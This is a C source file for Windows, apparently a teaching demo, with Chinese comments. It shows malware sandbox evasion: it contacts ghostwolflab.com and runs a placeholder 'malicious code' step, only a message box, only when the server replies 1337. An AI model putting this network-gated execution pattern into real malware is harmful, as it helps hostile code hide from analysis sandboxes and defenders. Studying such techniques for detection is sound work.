#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

bool CheckInternetConnectionAndExecute() {
    // 打开 HTTP 会话
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        return false;
    }

    // 连接到服务器
    HINTERNET hConnection = WinHttpConnect(hSession, L"ghostwolflab.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnection) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 创建 HTTP 请求
    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 发送 HTTP 请求
    BOOL status = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!status) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 接收 HTTP 响应
    WinHttpReceiveResponse(hRequest, 0);

    // 查询可用数据
    DWORD responseLength = 0;
    WinHttpQueryDataAvailable(hRequest, &responseLength);
    if (responseLength == 0) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 分配缓冲区读取响应数据
    PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
    if (!response) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD bytesRead = 0;
    WinHttpReadData(hRequest, response, responseLength, &bytesRead);

    // 检查响应数据
    if (atoi((PSTR)response) != 1337) {
        HeapFree(GetProcessHeap(), 0, response);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 清理资源
    HeapFree(GetProcessHeap(), 0, response);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnection);
    WinHttpCloseHandle(hSession);

    // 仅当收到特定响应后才执行恶意代码
    printf("Executing malicious code...\n");
    MessageBoxA(NULL, "You have been infected by a malware!", "Malware Alert", MB_OK | MB_ICONWARNING);
    return true;
}

int main() {
    if (!CheckInternetConnectionAndExecute()) {
        printf("Running inside a sandbox.\n");
    } else {
        printf("Not running inside a sandbox.\n");
    }

    return 0;
}
